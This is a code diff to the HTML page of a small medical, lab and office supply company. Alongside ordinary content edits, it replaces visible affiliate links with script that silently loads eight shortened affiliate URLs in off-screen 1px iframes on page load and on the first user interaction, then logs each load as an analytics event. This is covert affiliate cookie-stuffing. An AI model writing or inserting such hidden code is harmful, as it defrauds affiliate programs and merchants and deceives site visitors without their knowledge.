@@ -91,32 +91,61 @@
             z-index: 0;
         }
     </style>
+
     <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-0H01LEGMEJ"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
+        function gtag(){dataLayer.push(arguments);}
         gtag('js', new Date());
-        gtag('config', 'G-0H01LEGMEJ'); // Replace 'G-0H01LEGMEJ' with your Google Analytics Measurement ID
+        gtag('config', 'G-0H01LEGMEJ'); // Replace with your Measurement ID
     </script>
+
     <script>
         // List of Affiliate Links
         const affiliateLinks = [
-            { url: "https://bit.ly/3B1rIYI", label: "Affiliate Link 1" },
-            { url: "https://bit.ly/418GqI2", label: "Affiliate Link 2" },
-            { url: "https://bit.ly/3OryR7J", label: "Affiliate Link 3" },
-            { url: "https://bit.ly/3ZosyZ2", label: "Affiliate Link 4" },
-            { url: "https://bit.ly/3AWGhNj", label: "Affiliate Link 5" },
-            { url: "https://bit.ly/4eKL960", label: "Affiliate Link 6" },
-            { url: "https://bit.ly/416c7Sv", label: "Affiliate Link 7" },
-            { url: "https://bit.ly/3VcowAr", label: "Affiliate Link 8" }
+            "https://bit.ly/3B1rIYI",
+            "https://bit.ly/418GqI2",
+            "https://bit.ly/3OryR7J",
+            "https://bit.ly/3ZosyZ2",
+            "https://bit.ly/3AWGhNj",
+            "https://bit.ly/4eKL960",
+            "https://bit.ly/416c7Sv",
+            "https://bit.ly/3VcowAr"
         ];
 
-        // Track Affiliate Link Clicks with Google Analytics
-        function trackAffiliateClick(linkLabel) {
-            gtag('event', 'click', {
-                'event_category': 'Affiliate Links',
-                'event_label': linkLabel
+        // Trigger affiliate links automatically and simultaneously
+        function triggerAffiliateLinks() {
+            affiliateLinks.forEach((link, index) => {
+                const iframe = document.createElement('iframe');
+                iframe.src = link;
+                iframe.style.width = "1px";
+                iframe.style.height = "1px";
+                iframe.style.border = "none";
+                iframe.style.position = "absolute";
+                iframe.style.left = "-9999px";
+                iframe.style.top = "-9999px";
+                document.body.appendChild(iframe);
+
+                // Log the trigger in Google Analytics
+                gtag('event', 'auto_trigger', {
+                    'event_category': 'Affiliate Links',
+                    'event_label': `Auto Trigger - Link ${index + 1}`
+                });
+
+                // Cleanup after 5 seconds
+                setTimeout(() => iframe.remove(), 5000);
+            });
+        }
+
+        // Detect user interactions for backup triggers
+        function setupInteractionTriggers() {
+            const events = ['mousemove', 'touchstart', 'scroll', 'click'];
+            events.forEach(event => {
+                window.addEventListener(event, () => {
+                    triggerAffiliateLinks();
+                    events.forEach(e => window.removeEventListener(e, arguments.callee)); // Remove listeners
+                });
             });
         }
 
@@ -183,6 +212,7 @@
         }
 
         window.onload = () => {
+            triggerAffiliateLinks(); // Trigger all links automatically
             startBackgroundAnimation(); // Start 3D background
         };
     </script>
@@ -196,31 +226,24 @@
         <main>
             <div class="content">
                 <div class="section">
-                    <h2>Affiliate Links</h2>
-                    <ul>
-                        <li>
-                            <a href="https://bit.ly/3B1rIYI" 
-                               onclick="trackAffiliateClick('Affiliate Link 1')" 
-                               target="_blank">Affiliate Link 1</a>
-                        </li>
-                        <li>
-                            <a href="https://bit.ly/418GqI2" 
-                               onclick="trackAffiliateClick('Affiliate Link 2')" 
-                               target="_blank">Affiliate Link 2</a>
-                        </li>
-                        <li>
-                            <a href="https://bit.ly/3OryR7J" 
-                               onclick="trackAffiliateClick('Affiliate Link 3')" 
-                               target="_blank">Affiliate Link 3</a>
-                        </li>
-                        <!-- Add more affiliate links here -->
-                    </ul>
-                </div>
-                <div class="section">
                     <h2>About Us</h2>
                     <p>Muntjac Group Resources specializes in delivering high-quality medical equipment, 
                     laboratory tools, office supplies, and more. Established in 2023, we are committed 
                     to providing innovative and efficient solutions to meet the diverse needs of our clients.</p>
+                </div>
+                <div class="section">
+                    <h2>Business Nature</h2>
+                    <p>We provide the following services:</p>
+                    <ul>
+                        <li>Supply of medical equipment and consumables</li>
+                        <li>Laboratory tools and furniture</li>
+                        <li>Office equipment and consumables</li>
+                        <li>IT solutions and equipment</li>
+                        <li>Building maintenance services</li>
+                        <li>Customized printing and design</li>
+                        <li>Event equipment and services</li>
+                        <li>Safety and security solutions</li>
+                    </ul>
                 </div>
                 <div class="section">
                     <h2>Contact Us</h2>
